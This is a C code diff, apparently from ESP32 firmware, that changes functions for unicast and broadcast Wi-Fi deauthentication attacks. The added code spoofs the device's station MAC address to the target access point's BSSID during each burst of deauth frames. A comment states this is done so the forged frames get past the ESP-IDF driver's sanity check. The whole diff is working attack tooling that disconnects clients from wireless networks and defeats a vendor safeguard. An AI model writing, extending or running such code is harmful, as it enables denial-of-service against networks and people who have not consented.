@@ -109,15 +109,19 @@ static uint16_t s_hot_seq = 0;
 static void unicast_deauth(const uint8_t *sta, const uint8_t *bssid, uint8_t ch, int bursts)
 {
     if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
-    /* Block the hopper for the duration of the burst so the channel
-     * doesn't shift mid-attack. */
+    /* Block the hopper + spoof STA MAC to BSSID so frames pass the
+     * ESP-IDF blob sanity check. */
     bool prev_lock = s_locked;
     s_locked = true;
+    uint8_t saved_mac[6];
+    wifi_save_sta_mac(saved_mac);
+    wifi_spoof_sta_mac(bssid);
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < bursts; ++i) {
         wifi_deauth_pair(sta, bssid, &s_hot_seq);
         delay(5);
     }
+    wifi_spoof_sta_mac(saved_mac);
     s_locked = prev_lock;
 }
 
@@ -126,11 +130,15 @@ static void broadcast_deauth(const uint8_t *bssid, uint8_t ch, int bursts)
     if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
     bool prev_lock = s_locked;
     s_locked = true;
+    uint8_t saved_mac[6];
+    wifi_save_sta_mac(saved_mac);
+    wifi_spoof_sta_mac(bssid);
     esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
     for (int i = 0; i < bursts; ++i) {
         wifi_deauth_broadcast(bssid, &s_hot_seq);
         delay(5);
     }
+    wifi_spoof_sta_mac(saved_mac);
     s_locked = prev_lock;
 }
 
